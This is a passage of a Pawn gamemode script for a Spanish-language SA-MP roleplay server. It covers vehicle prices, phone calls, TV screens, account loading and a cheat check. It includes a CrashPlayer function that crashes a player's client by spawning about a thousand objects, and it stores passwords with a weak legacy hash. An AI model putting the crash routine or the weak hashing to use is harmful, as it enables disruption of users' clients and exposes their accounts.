		case	18619: objid = 19437;
		case	18618: objid = 19438;
		case	18617: objid = 19439;
		case	18616: objid = 19440;
		case	18615: objid = 19441;
		case	18614: objid = 19442;
		case	18613: objid = 19443;
		case	18612: objid = 19444;
		case	18611: objid = 19445;
		case	18610: objid = 19446;
		case	18465: objid = 19447;
		case	18464: objid = 19448;
		case	18463: objid = 19449;
		case	18462: objid = 19450;
		case	18461: objid = 19451;
		case	18460: objid = 19452;
		case	18459: objid = 19453;
		case	18458: objid = 19454;
		case	18457: objid = 19455;
		case	18456: objid = 19456;
		case	18455: objid = 19457;
		case	18454: objid = 19458;
		case	18453: objid = 19459;
		case	18447: objid = 19460;
		case	3916: objid = 19461;
		case	3915: objid = 19462;
		case	3914: objid = 19463;
		case	3913: objid = 19464;
		case	3912: objid = 19465;
		case 	3908: objid = 19330;
		case 	3907: objid = 19331;
		case 	3909: objid = 19466;
		case 	8081: objid = 19302;
		case 	8082: objid = 19303;
		case 	8083: objid = 19304;
		case 	8084: objid = 19467;
 		case    1850: objid = 19425;
   		case 	14383..14483: objid += 4248;
     	case 	14770..14856: objid += 4063;
      	case 	14858..14871: objid += 4062;
      	case 	18000..18036: objid += 934;
      	case 	18038..18101: objid += 933;
      	case 	14872..14883: objid += 4163;
      	case 	14885..14891: objid += 4162;
      	case 	13590..13667: objid += 5142;
      	case 	14500..14522: objid += 4310;
      	case 	12835..12944: objid += 6219;
      	case 	16000..16143: objid += 3164;
      	case 	14892: objid += 5009;
		default: objid = id;
	}
	return objid;
}


stock MostrarTDTutorial(playerid)
{
	if(TituloTuto[playerid] == PlayerText:INVALID_TEXT_DRAW)
	{
		TituloTuto[playerid] = CreatePlayerTextDraw(playerid,300.000000, 330.000000, "Titulo del tutoh");
		PlayerTextDrawAlignment(playerid,TituloTuto[playerid], 2);
		PlayerTextDrawBackgroundColor(playerid,TituloTuto[playerid], 255);
		PlayerTextDrawFont(playerid,TituloTuto[playerid], 3);
		PlayerTextDrawLetterSize(playerid,TituloTuto[playerid], 0.700000, 2.000000);
		PlayerTextDrawColor(playerid,TituloTuto[playerid], -2068119297);
		PlayerTextDrawSetOutline(playerid,TituloTuto[playerid], 1);
		PlayerTextDrawSetProportional(playerid,TituloTuto[playerid], 1);

		InfoTuto[playerid][0] = CreatePlayerTextDraw(playerid,315.000000, 360.000000, "Es un lugar muy transitado por los turistas y visitantes, ya que es un icono importante de la ciudad.");
		PlayerTextDrawAlignment(playerid,InfoTuto[playerid][0], 2);
		PlayerTextDrawBackgroundColor(playerid,InfoTuto[playerid][0], -1);
		PlayerTextDrawFont(playerid,InfoTuto[playerid][0], 1);
		PlayerTextDrawLetterSize(playerid,InfoTuto[playerid][0], 0.339999, 1.500000);
		PlayerTextDrawColor(playerid,InfoTuto[playerid][0], 255);
		PlayerTextDrawSetOutline(playerid,InfoTuto[playerid][0], 1);
		PlayerTextDrawSetProportional(playerid,InfoTuto[playerid][0], 1);

		InfoTuto[playerid][1] = CreatePlayerTextDraw(playerid,315.000000, 380.000000, "Es un lugar muy transitado por los turistas y visitantes, ya que es un icono importante de la ciudad.");
		PlayerTextDrawAlignment(playerid,InfoTuto[playerid][1], 2);
		PlayerTextDrawBackgroundColor(playerid,InfoTuto[playerid][1], -1);
		PlayerTextDrawFont(playerid,InfoTuto[playerid][1], 1);
		PlayerTextDrawLetterSize(playerid,InfoTuto[playerid][1], 0.339999, 1.500000);
		PlayerTextDrawColor(playerid,InfoTuto[playerid][1], 255);
		PlayerTextDrawSetOutline(playerid,InfoTuto[playerid][1], 1);
		PlayerTextDrawSetProportional(playerid,InfoTuto[playerid][1], 1);

		InfoTuto[playerid][2] = CreatePlayerTextDraw(playerid,315.000000, 400.000000, "Es un lugar muy transitado por los turistas y visitantes, ya que es un icono importante de la ciudad.");
		PlayerTextDrawAlignment(playerid,InfoTuto[playerid][2], 2);
		PlayerTextDrawBackgroundColor(playerid,InfoTuto[playerid][2], -1);
		PlayerTextDrawFont(playerid,InfoTuto[playerid][2], 1);
		PlayerTextDrawLetterSize(playerid,InfoTuto[playerid][2], 0.339999, 1.500000);
		PlayerTextDrawColor(playerid,InfoTuto[playerid][2], 255);
		PlayerTextDrawSetOutline(playerid,InfoTuto[playerid][2], 1);
		PlayerTextDrawSetProportional(playerid,InfoTuto[playerid][2], 1);
	}
	return 1;
}

stock CrashPlayer(playerid)
{
   for(new i=0;i<=1000;i++) CreatePlayerObject(playerid,4108,0,0,0,0,0,0);
   return 1;
}

//Nombres
stock NombreJugador(playerid)
{
	if(GetPVarInt(playerid,"USANDO_MASCARA"))
	{
		new _Enmascarado[24] = "Enmascarado";
		return _Enmascarado;
	}
	return Nombre_[playerid];
}

stock NombreJugador_(playerid)
{
	return Nombre_[playerid];
}

stock NombreVehiculo(vehid)
{
	new
		str[25],
		Model = GetVehicleModel(vehid);

	if(400 <= Model <= 611)
	{
		format(str,sizeof(str),"%s",TituloVehiculo[Model-400]);
	}
	else
	{
	    str = "Unknown";
	}
	return str;
}

stock U_Usuario(playerid)//
{
    new string[60];
    format(string,sizeof(string),U_Archivo,pName(playerid));
    return string;
}

stock SacarTDRegistro(playerid)//
{
	Loop(i,6,0) TextDrawHideForPlayer(playerid,Registro[i]);

	TextDrawHideForPlayer(playerid,FlechaSexo[0]);
	TextDrawHideForPlayer(playerid,FlechaSexo[1]);

	TextDrawHideForPlayer(playerid,FlechaEdad[0]);
	TextDrawHideForPlayer(playerid,FlechaEdad[1]);

	TextDrawHideForPlayer(playerid,FlechaPelea[0]);
	TextDrawHideForPlayer(playerid,FlechaPelea[1]);

	TextDrawHideForPlayer(playerid,FlechaEstilo[0]);
	TextDrawHideForPlayer(playerid,FlechaEstilo[1]);

	PlayerTextDrawHide(playerid,Sexo[playerid]);
	PlayerTextDrawHide(playerid,Edad[playerid]);
	PlayerTextDrawHide(playerid,Pelea[playerid]);
	PlayerTextDrawHide(playerid,Estilo[playerid]);

	return 1;
}

stock MostrarCajero(playerid)
{
	TextDrawShowForPlayer(playerid,Cajero[0]);
	TextDrawShowForPlayer(playerid,Cajero[1]);
	TextDrawShowForPlayer(playerid,Cajero[2]);

	TextDrawShowForPlayer(playerid,Operaciones[0]);
	TextDrawShowForPlayer(playerid,Operaciones[1]);
	TextDrawShowForPlayer(playerid,Operaciones[2]);
	TextDrawShowForPlayer(playerid,SCajero);
	PlayerTextDrawShow(playerid,Cuenta_Balance[0][playerid]);
	PlayerTextDrawShow(playerid,Cuenta_Balance[1][playerid]);

	new Str[MAX_PLAYER_NAME + 20],Str2[20];
	A_Format(Str,"Cuenta: ~g~%s",pName(playerid));
	A_Format(Str2,"Balance: ~g~$%d",InfoCuentaB[InfoJugador[playerid][jIDCuentaB]][cuenDinero]);
	PlayerTextDrawSetString(playerid,Cuenta_Balance[0][playerid],Str);
	PlayerTextDrawSetString(playerid,Cuenta_Balance[1][playerid],Str2);
	SelectTextDraw(playerid,C_ROJO);
	SetPVarInt(playerid,"EnCajero",1);
	return 1;
}

stock SacarCajero(playerid)
{
	TextDrawHideForPlayer(playerid,Cajero[0]);
	TextDrawHideForPlayer(playerid,Cajero[1]);
	TextDrawHideForPlayer(playerid,Cajero[2]);

	TextDrawHideForPlayer(playerid,Operaciones[0]);
	TextDrawHideForPlayer(playerid,Operaciones[1]);
	TextDrawHideForPlayer(playerid,Operaciones[2]);
	TextDrawHideForPlayer(playerid,SCajero);
	PlayerTextDrawHide(playerid,Cuenta_Balance[0][playerid]);
	PlayerTextDrawHide(playerid,Cuenta_Balance[1][playerid]);
	CancelSelectTextDraw(playerid);
	SetPVarInt(playerid,"EnCajero",0);
	Descongelar(playerid);
	return 1;
}

stock PrecioVeh(modelo)
{
	switch(modelo)
	{
	    case 445: return 11000;//admiral
	    case 507: return 15000;//elegant
	    case 585: return 12000;//emperor
	    case 492: return 9000;//greenwood
	    case 546: return 10000;//intruder
	    case 551: return 11000;//merit
	    case 516: return 11500;//nebula
	    case 467: return 7000;//oceanic
	    case 404: return 6500;//perennial
	    case 426: return 9000;//premier
	    case 547: return 12000;//primo
	    case 479: return 15000;//regina
	    case 405: return 22000;//sentinel
	    case 458: return 11000;//solair
	    case 580: return 9000;//stafford
	    case 550: return 17000;//sunrise
	    case 540: return 17000;//vincent
	    case 421: return 20000;//washington
	    case 529: return 14000;//willard
	    case 496: return 15000;//blista compact
	    case 401: return 19000;//bravura
	    case 518: return 12000;//Buccaneer
	    case 527: return 16000;//cadrona
	    case 542: return 3000;//clover
	    case 589: return 30000;//club
	    case 419: return 6000;//Esperanto
	    case 533: return 29000;//Feltzer
	    case 526: return 18000;//Fortune
	    case 474: return 12000;//Hermes
	    case 545: return 93000;//Hustler
	    case 517: return 17000;//Majestic
	    case 410: return 15000;//Manana
	    case 436: return 18000;//Previon
	    case 475: return 9000;//Sabre
	    case 439: return 17000;//Stallion
	    case 549: return 5000;//Tampa
	    case 491: return 22000;//Virgo
	    case 602: return 60000;//Alpha
	    case 429: return 130000;//Banshee
	    case 402: return 50000;//Buffalo
	    case 541: return 210000;//Bullet
	    case 415: return 115000;//Cheetah
	    case 480: return 55000;//Comet
	    case 587: return 55000;//Euros
	    case 434: return 250000;//Hotknife
	    case 411: return 260000;//Infernus
	    case 603: return 120000;//Phoenix
	    case 506: return 130000;//Super GT
	    case 451: return 300000;//Turismo
	    case 555: return 55000;//Windsor
	    case 477: return 95000;//ZR-350
	    case 562: return 61000;//Elegy
	    case 565: return 50000;//Flash
	    case 559: return 70000;//Jester
	    case 561: return 68000;//Stratum
	    case 560: return 65000;//Sultan
	    case 558: return 60000;//Uranus
	    case 422: return 30000;//Bobcat
	    case 579: return 64000;//Huntley
	    case 400: return 60000;//Landstalker
	    case 600: return 1500;//Picador
	    case 489: return 40000;//Rancher
	    case 543: return 8600;//Sadler
	    case 478: return 8000;//Walton
    	case 495: return 62000;//Sandking
		case 466: return 10000;//Glendale
	    case 554: return 65000;//Yosemite
	    case 482: return 30000;//Burrito
	    case 418: return 28000;//Moonbeam
	    case 413: return 18000;//Pony
	    case 536: return 15000;//Blade
	    case 575: return 30000;//Broadway
	    case 534: return 12000;//Remington
	    case 567: return 13500;//Savanna
	    case 535: return 15000;//Slamvan
	    case 566: return 9000;//Tahoma
	    case 576: return 7000;//Tornado
	    case 412: return 8000;//Voodoo
	    case 581: return 21000;//BF-400
	    case 509: return 400;//Bici
	    case 481: return 1500;//BMX
	    case 462: return 1500;//Faggio
	    case 521: return 33000;//FCR-900
	    case 463: return 30000;//Freeway
	    case 510: return 2000;//Mountain Bike
	    case 522: return 180000;//NRG-500
	    case 461: return 90000;//PCJ-600
	    case 468: return 22000;//Sanchez
	    case 586: return 40000;//Wayfarer
	    case 424: return 30000;//BF-INJECTION
	    case 446: return 460000;//Squallo (BOTE)
	    case 452: return 190000;//Speeder
	    case 453,454: return 260000;//Reefer, Tropic
	    case 472: return 190000;//Coastguard
	    case 473: return 90000;//Dinghy
	    case 487: return 400000; //Maverick
	    case 493: return 200000; //JetMax
	    case 500: return 50000; //Mesa
	    case 595: return 24000;//Launch
	    default: return 100505;
	}
	return 0;
}


stock CheckEpoca()
{
	new Epoca;
	getdate(Epoca);
	return Epoca;
}

//Prox detector
CALLBACK: ProxDetector(Float:radi, playerid, string[],col1,col2,col3,col4,col5)
{
   if(IsPlayerConnected(playerid))
   {
	  if(GetPVarInt(playerid, "VIENDO_TV")) return Mensaje(playerid, -1, "No puedes hacer esto mientras ves la TV.");
      if(GetPVarInt(playerid, "Muteado"  )) return Error(playerid,"¡Estás muteado!");
      new Float:posx, Float:posy, Float:posz;
      new Float:oldposx, Float:oldposy, Float:oldposz;
      new Float:tempposx, Float:tempposy, Float:tempposz;
      GetPlayerPos(playerid, oldposx, oldposy, oldposz);
      foreach(Player,i)
      {
         if(GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(i))
         {
            if(!BigEars[i])
            {
               GetPlayerPos(i, posx, posy, posz);
               tempposx = (oldposx -posx);
               tempposy = (oldposy -posy);
               tempposz = (oldposz -posz);
               if (((tempposx < radi/16) && (tempposx > -radi/16)) && ((tempposy < radi/16) && (tempposy > -radi/16)) && ((tempposz < radi/16) && (tempposz > -radi/16)))
               {
                  MensajeLargo(i, col1, string);
               }
               else if (((tempposx < radi/8) && (tempposx > -radi/8)) && ((tempposy < radi/8) && (tempposy > -radi/8)) && ((tempposz < radi/8) && (tempposz > -radi/8)))
               {
                  MensajeLargo(i, col2, string);
               }
               else if (((tempposx < radi/4) && (tempposx > -radi/4)) && ((tempposy < radi/4) && (tempposy > -radi/4)) && ((tempposz < radi/4) && (tempposz > -radi/4)))
               {
                  MensajeLargo(i, col3, string);
               }
               else if (((tempposx < radi/2) && (tempposx > -radi/2)) && ((tempposy < radi/2) && (tempposy > -radi/2)) && ((tempposz < radi/2) && (tempposz > -radi/2)))
               {
                  MensajeLargo(i, col4, string);
               }
               else if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
               {
                  MensajeLargo(i, col5, string);
               }
            }
            else
            {
               MensajeLargo(i, col1, string);
            }
         }
      }
   }
   return 1;
}

CALLBACK: LlamarNum(tipo,playerid,numero)
{
	if(!InfoJugador[playerid][jSaldo] && numero != NUMERO_POLICIA && numero != NUMERO_HOSPITAL && numero != NUMERO_CLARO)
	{
		PlayerTextDrawSetString(playerid,Numero[playerid],"~r~fallido");
		Error(playerid,"¡No tienes saldo!");
		return 1;
	}

	if(tipo == 0)
	{
		foreach(Player,i)
		{
		    if(InfoJugador[i][jNumeroCel] == numero)
		    {
		        if(GetPVarInt(i,"EN_LLAMADA")) return PlayerTextDrawSetString(playerid,Numero[playerid],"~r~ocupado");
		        new Str[80];
		        Loop(c,10,0)
		        {
					if(InfoJugador[playerid][jNumeroCel] == InfoJugador[i][jContacto][c])
					{
					    A_Format(Str,"Llamada recibida de "#CAZULRARO"%s. "#CINFO"(/atender)",VerNombreContacto(i,c));
						Mensaje(i,-1,Str);
			        	SetPVarInt(i,"NUM_MELLAMA",InfoJugador[playerid][jNumeroCel]);
						cmd_ame(i,"le suena el celular");
					    return 1;
					}
				}
	      		A_Format(Str,"Llamada recibida del número "#CAZULRARO"%d. "#CINFO"(/atender)",InfoJugador[playerid][jNumeroCel]);
	        	Mensaje(i,-1,Str);
	        	SetPVarInt(i,"NUM_MELLAMA",InfoJugador[playerid][jNumeroCel]);
				cmd_ame(i,"le suena el celular");
		        return 1;
		    }
		}
	 	PlayerTextDrawSetString(playerid,Numero[playerid],"~r~fallido");
		Error(playerid,"¡Número incorrecto!");
	 	alm(strNum[playerid],"");
	}
	else if(tipo == 1)
	{
		if(numero == NUMERO_POLICIA)
		{
  			new SMS[128];
     		GetPVarString(playerid,"CEL_SMS",SMS,sizeof SMS);
		    new Str[120];
		    A_Format(Str,"%s llamó a la policía por: "#CINFO"'%s'",NombreJugador(playerid),SMS);
			MensajeFaccion(IDLSPD,Str);
			A_Format(Str,"Para rastrear la ubicación de la llamada, use "#CINFO"(/rastrear %d)",playerid);
			MensajeFaccion(IDLSPD,Str);
			PlayerTextDrawSetString(playerid,Numero[playerid],"~g~enviado");
			SetPVarInt(playerid,"LLAMO_POLICIA",1);
			return 1;
		}
		else if(numero == NUMERO_HOSPITAL)
		{
  			new SMS[128];
     		GetPVarString(playerid,"CEL_SMS",SMS,sizeof SMS);
		    new Str[120];
		    A_Format(Str,"%s llamó al hospital por: "#CINFO"'%s'",NombreJugador(playerid),SMS);
			MensajeFaccion(IDLSMD,Str);
			A_Format(Str,"Para rastrear la ubicación de la llamada, use "#CINFO"(/rastrear %d)",playerid);
			MensajeFaccion(IDLSMD,Str);
			PlayerTextDrawSetString(playerid,Numero[playerid],"~g~enviado");
			SetPVarInt(playerid,"LLAMO_HOSPITAL",1);
			return 1;
		}

		else if(numero == NUMERO_MECANICOS)
		{
  			new SMS[128];
     		GetPVarString(playerid,"CEL_SMS",SMS,sizeof SMS);
		    new Str[120];
		    A_Format(Str,"%s requiere un mecánico, por: "#CINFO"'%s'",NombreJugador(playerid),SMS);
			MensajeFaccion(IDMECANICOS,Str);
			A_Format(Str,"Para rastrear la ubicación de la llamada, use "#CINFO"(/rastrear %d)",playerid);
			MensajeFaccion(IDMECANICOS,Str);
			PlayerTextDrawSetString(playerid,Numero[playerid],"~g~enviado");
			SetPVarInt(playerid,"LLAMO_MECANICOS",1);
			return 1;
		}
		else if(numero == NUMERO_CLARO)
		{
  			new SMS[128];
     		GetPVarString(playerid,"CEL_SMS",SMS,sizeof SMS);
			if(!strcmp(SMS,"saldo",true))
			{
			    new Str[20];
			    A_Format(Str,"~g~saldo: %d",InfoJugador[playerid][jSaldo]);
				PlayerTextDrawSetString(playerid,Numero[playerid],Str);
				return 1;
			}
			return Error(playerid,"Opciones disponibles: "#CAZUL2"SALDO");
		}

		foreach(Player,i)
		{
		    if(InfoJugador[i][jNumeroCel] == numero)
		    {
		        new Str[90],SMS[128];
		        GetPVarString(playerid,"CEL_SMS",SMS,sizeof SMS);
		        Loop(c,10,0)
		        {
					if(InfoJugador[playerid][jNumeroCel] == InfoJugador[i][jContacto][c])
					{
						InfoJugador[playerid][jSaldo] -= 2;
					    A_Format(Str,"Mensaje recibido de "#CAZULRARO"%s:",VerNombreContacto(i,c));
					    Dialog(i,dError,DIALOG_STYLE_MSGBOX,Str,SMS,"Cerrar","");
						cmd_ame(i,"le llega un mensaje de texto");
			 			PlayerTextDrawSetString(playerid,Numero[playerid],"~g~enviado");
					    return 1;
					}
				}
	      		A_Format(Str,"Mensaje recibido:"#CAZULRARO"%d:",InfoJugador[playerid][jNumeroCel],SMS);
	        	Dialog(i,dError,DIALOG_STYLE_MSGBOX,Str,SMS,"Cerrar","");
				cmd_ame(i,"le llega un mensaje de texto");
				PlayerTextDrawSetString(playerid,Numero[playerid],"~g~enviado");
		        return 1;
		    }
		}
	 	PlayerTextDrawSetString(playerid,Numero[playerid],"~r~fallido");
		Error(playerid,"¡Número incorrecto!");
	 	alm(strNum[playerid],"");
	}
	return 1;
}

iswheelmodel(modelid) {

    new wheelmodels[17] = {1025,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1096,1097,1098};

    Loop(I,sizeof wheelmodels, 0) {

        if (modelid == wheelmodels[I])
            return true;

    }

    return false;
}

IllegalCarNitroIde(carmodel) {

    new illegalvehs[29] = { 581, 523, 462, 521, 463, 522, 461, 448, 468, 586, 509, 481, 510, 472, 473, 493, 595, 484, 430, 453, 452, 446, 454, 590, 569, 537, 538, 570, 449 };

    Loop(I,sizeof illegalvehs, 0) {

        if (carmodel == illegalvehs[I])
            return true;

    }

    return false;
}

stock PosEx(playerid, Float:x, Float:y, Float:z, int = -1, vw = -1)
{
	SetPlayerPos(playerid, x, y, z);
	if(int != -1) SetPlayerInterior(playerid, int);
	if(vw != -1) SetPlayerVirtualWorld(playerid, vw);
	return true;
}

ApagarTV(playerid, id)
{
	InfoTV[id][tvPrendida] = false;
	TextDrawHideForPlayer(playerid, TV_Azul);
	TextDrawShowForPlayer(playerid, TV_Apagado);
	return 1;
}

PrenderTV(playerid, id)
{
	InfoTV[id][tvPrendida] = true;
	TextDrawHideForPlayer(playerid, TV_Apagado);
	return 1;
}

MostrarTDTV(playerid)
{
	Loop(i, 9, 0) TextDrawShowForPlayer(playerid, TDTV[i]);
	return 1;
}

SacarTDTV(playerid)
{
	Loop(i, 9, 0) TextDrawHideForPlayer(playerid, TDTV[i]);
	return 1;
}


MostrarTV(playerid, canal)
{
	switch(canal)
	{
	    case CANAL_AV1:
	    {
	        Error(playerid, "~g~~h~AV1");
			TextDrawShowForPlayer(playerid, TV_Apagado);
			SacarTDTV(playerid);
			MostrarTDTV(playerid);
		}
	    case CANAL_AV2:
	    {
	        Error(playerid, "~g~~h~AV2");
			TextDrawShowForPlayer(playerid, TV_Apagado);
			SacarTDTV(playerid);
			MostrarTDTV(playerid);
		}
		case CANAL_LSTV:
		{
			if(!EnTransmision_AV)
			{
				TextDrawShowForPlayer(playerid, TV_Azul);
			}
			else TextDrawHideForPlayer(playerid, TV_Azul);
			SetPlayerCameraPos(playerid, -153.7117, -290.7969, 1050.8774);
			SetPlayerCameraLookAt(playerid, -153.7225, -291.7954, 1050.6328);
		}
	}
	SetPVarInt(playerid, "TV_CANAL", canal);

	return 1;
}

stock illegal_nos_vehicle(PlayerID)
{
    new carid = GetPlayerVehicleID(PlayerID);
    new playercarmodel = GetVehicleModel(carid);

    return IllegalCarNitroIde(playercarmodel);

}

public OnPlayerLeaveDynamicArea(playerid, areaid)
{
	new
	    VehID = GetPlayerVehicleID(playerid);
	    
	if(VehID && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
	    if(areaid == zCamionerosLVL1 && Veh[VehID][vTrabajo] == ID_Camionero)
	    {
	    	if(isnull(InfoCamion[VehID][camChofer]))
	    	{
	    	    return SetVehicleToRespawn(VehID);
			}
		}
		if(areaid == zCosechadorLVL1 && GetVehicleModel(VehID) == 532)
		{
		    return SetVehicleToRespawn(VehID);
		}
	}
	return 1;
}

public OnPlayerModelSelectionEx(playerid, response, extraid, modelid)
{
	switch(extraid)
	{
		case LIST_INV:
		{
			if(GetPVarInt(playerid, "INT_AJENO"))
			{
			    DeletePVar(playerid, "INT_AJENO");
			    return 1;
			}
			return (modelid != -1) ? SetPlayerObject(playerid, modelid) : 0;
		}
	}
	return 1;
}

stock islegalcarmod(vehicleide, componentid)
{
    new modok = false;

    if ( (iswheelmodel(componentid)) || (componentid == 1086) || (componentid == 1087) || ((componentid >= 1008) && (componentid <= 1010)))
	{
        new nosblocker = IllegalCarNitroIde(vehicleide);
        if (!nosblocker)
            modok = true;
    }
	else
	{
	    Loop(I,sizeof legalmods, 0)
		{
			if (legalmods[I][0] == vehicleide)
			{
	  			for(new J = 1; J < 22; J++)
	  			{
	     			if (legalmods[I][J] == componentid) modok = true;
	          	}
	        }
	    }
	}
    return modok;
}

stock CrearCuenta(playerid, password[])
{
	new
		INI:Arch = INI_Open(U_Usuario(playerid));

	InfoJugador[playerid][jClave] = udb_hash(password);

	INI_SetTag(Arch,"data");
	INI_WriteInt(Arch, "Contraseña", InfoJugador[playerid][jClave]);
	INI_Close(Arch);
	return 1;
}

CALLBACK: CargarCuenta(playerid)
{
	if(InfoJugador[playerid][jBaneado])
	{
	    new Str[180];
	    A_Format(Str,""#CROJO"ATENCIÓN: "#CBLANCO"Esta cuenta "#CAZUL2"(%s)"#CBLANCO" se encuentra baneada, y bloqueada.\n\nPuede solicitar un desban, ingresando a "#CAZULRARO""#FORO_SERVER".",pName(playerid));
		Dialog(playerid,dError,DIALOG_STYLE_MSGBOX,""#CROJO"BANEADO",Str,"Cerrar","");
		_Kick(playerid,"SERVER","Cuenta baneada");
		return 1;
	}

	for(new i; InfoJ:i < InfoJ; i++)
	{
	    InfoJugadorTemp[playerid][InfoJ:i] = InfoJugador[playerid][InfoJ:i];
	    if(InfoJugadorTemp[playerid][InfoJ:i] != InfoJugador[playerid][InfoJ:i])
	    {
	        printf("ERROR: InfoJugadorTemp=%d | InfoJugador=%d", InfoJugadorTemp[playerid][InfoJ:i], InfoJugador[playerid][InfoJ:i]);
		}
	}
	
	if(InfoJugador[playerid][jAdmin])
	{
		LogAdmin(playerid, "Ingresó");
	}

	SetSpawnInfo(playerid, 0, InfoJugador[playerid][jRopa][0], InfoJugador[playerid][jPosX], InfoJugador[playerid][jPosY], InfoJugador[playerid][jPosZ], 0.0, 0, 0, 0, 0, 0, 0);

	SaveIp(playerid);
	
	TogglePlayerSpectating(playerid, false);

	TextDrawShowForPlayer(playerid,Barraversion);
	TextDrawShowForPlayer(playerid,HS);
	TextDrawShowForPlayer(playerid,HoraB);

	CongelarEx(playerid,6);
	SetTimerEx("CheckHackCamera", 6000, false, "ii", playerid, 0);

	GameTextForPlayer(playerid,"~w~Espera, ~b~~h~~h~~h~cargando",4000,3);
	LimpiarPantalla(playerid,50);

	Mensaje (playerid,-1," ");
	MensajeF(playerid,-1,"¡Bienvenido a {88C17F}Optimus RolePlay"#CBLANCO", %s!", NombreJugador_(playerid));
	Mensaje (playerid,-1,"Comandos de ayuda: "#CINFO"/informacion "#CBLANCO"| "#CINFO"/duda "#CBLANCO"| "#CINFO"/canal dudas");
	Mensaje (playerid,-1," ");

	// Niveles
	SetProgressBarMaxValue(BExp[playerid],((InfoJugador[playerid][jNivel]+1)*3)*60);
	SetProgressBarValue(BExp[playerid],InfoJugador[playerid][jExperiencia]);
	UpdateProgressBar(BExp[playerid], playerid);
	SetPlayerScore(playerid,InfoJugador[playerid][jNivel]);

	// Necesidades
	SetProgressBarValue(BHambre[playerid], InfoJugador[playerid][jHambre]);
	ShowProgressBarForPlayer(playerid,BHambre[playerid]);

	SetProgressBarValue(BCansancio[playerid], InfoJugador[playerid][jCansancio]);
	ShowProgressBarForPlayer(playerid,BCansancio[playerid]);

	SetProgressBarValue(BOrina[playerid], InfoJugador[playerid][jOrina]);
	ShowProgressBarForPlayer(playerid,BOrina[playerid]);

	//General
	SetPlayerInterior(playerid,InfoJugador[playerid][jInterior]);
	SetPlayerVirtualWorld(playerid,InfoJugador[playerid][jVirtualWorld]);
	SetPlayerHealth(playerid,InfoJugador[playerid][jVida]);
	SetPlayerArmour(playerid,InfoJugador[playerid][jChaleco]);

	//Cargar Attach objects
 	SetTimerEx("CargarAttachedO",1000,false,"i",playerid);

	ResetPlayerMoney(playerid);
	GivePlayerMoney(playerid,InfoJugador[playerid][jDinero]);

	new
		bool:S;

 	Loop(i,MAX_ROPA,0)
  	{
   		if(InfoJugador[playerid][jRopa][i])
     	{
			SetPlayerSkin(playerid,InfoJugador[playerid][jRopa][i]);
			S = true;
		}
	}
	if(!S)
	{
		switch(InfoJugador[playerid][jSexo])
		{
  			case 1: SetPlayerSkin(playerid,252);
	    	case 2: SetPlayerSkin(playerid,140);
		}
	}

	// Cargar armas
	Loop(i,13,0)
	{
	    if(InfoJugador[playerid][jArmas][i] && InfoJugador[playerid][jBalas][i])
	    {
	        if(InfoJugador[playerid][jArmas][i] == WEAPON_KNIFE)
	            Mensaje(playerid, -1, "Se te retiró el cuchillo debido a una nueva regla del servidor.");

			else
				GivePlayerWeapon(playerid,InfoJugador[playerid][jArmas][i],InfoJugador[playerid][jBalas][i]);
		}
	}
	StopAudioStreamForPlayer(playerid);

	// Otros
	PreloadAnimLib(playerid, "BOMBER");
	PreloadAnimLib(playerid, "CRACK");
	PreloadAnimLib(playerid, "DEALER");
	PreloadAnimLib(playerid, "INT_SHOP");
	PreloadAnimLib(playerid, "GANGS");
	PreloadAnimLib(playerid, "GYMNASIUM");
	PreloadAnimLib(playerid, "BSKTBALL");
	PreloadAnimLib(playerid, "PED");
	PreloadAnimLib(playerid, "KNIFE");
	PreloadAnimLib(playerid, "MEDIC");
	PreloadAnimLib(playerid, "GHANDS");
	PreloadAnimLib(playerid, "FOOD");
	PreloadAnimLib(playerid, "SHOP");
	PreloadAnimLib(playerid, "WUZI");
	PreloadAnimLib(playerid, "CARRY");
	PreloadAnimLib(playerid, "GRAFFITI");
	PreloadAnimLib(playerid, "HEIST9");

 	SetPlayerColor(playerid, 0xFFFFFF00);

   	gettime(Hora, Minuto);
	SetPlayerTime(playerid,Hora,Minuto);

	CaminarPelear(playerid);

	SetPVarInt(playerid,"NIVEL_ADMIN",InfoJugador[playerid][jAdmin]);

	SetPVarInt(playerid,"CargoCuenta",1);

	printf("- Cuenta cargada: [%s | TIEMPO: %d MS]",pName(playerid),(GetTickCount() - GetPVarInt(playerid,"TIEMPO_CCUENTA")));
	DeletePVar(playerid,"TIEMPO_CCUENTA");

	UpdatePlayerVehicleTD(playerid, true);

	new
	    Level = GetPlayerScore(playerid),
		SkillLevel = (Level < 5) ? ((Level*2)*100) : (1000);

	for(new i; i <= 10; i++)
	    SetPlayerSkillLevel(playerid, i, SkillLevel);

	CargarLlaves(playerid);
	
	if(ID_Familia(playerid) && ID_Faccion(playerid))
	{
		new
		    str[350];
		    
		A_Format(str, ""#CROJO"ATENCIÓN: "#CBLANCO"Ahora en el servidor, NO se permite tener "#CAMARILLO"FAMILIA "#CBLANCO"y "#CAMARILLO"FACCIÓN "#CBLANCO"simultáneamente.\n\nAhora, te ves obligado a elegir entre mantener tu Familia, o Facción.\n\n"#CINFO"Familia: "#CVERDE"%s\n"#CINFO"Facción: "#CVERDE"%s\n\n"#CBLANCO"¿Qué eliges?", InfoFamilia[ID_Familia(playerid)][fNombre], NombreFaccion(ID_Faccion(playerid)) );
		Dialog(playerid, dElegirFamFac, DIALOG_STYLE_MSGBOX, ""#CVERDE"¿Familia o Facción?", str, "Familia", "Facción");
		return 1;
	}
	
	return 1;
}

CALLBACK: CheckHackCamera(playerid, start)
{
	new
		Float:x,
		Float:y,
		Float:z;

    GetPlayerCameraFrontVector(playerid, x, y, z);
    #pragma unused x
    #pragma unused y
    if(z < -0.7)
    {
        LimpiarPantalla(playerid, 10);
        
        if(start == 0)
			Dialog(playerid, dError, DIALOG_STYLE_MSGBOX, ""#CROJO"Cheat detectado", ""#CBLANCO"Está prohibido ingresar a este servidor con algún tipo de "#CROJO"Cheat o Hack.\n\nSi deseas jugar en el servidor, deberás quitartelo obligatoriamente. De lo contrario, no serás bienvenido aquí.\n\nSe sumó una advertencia a tu cuenta. Cuando llegues a las tres advertencias, te verás baneado.", "Cerrar", "");

		else
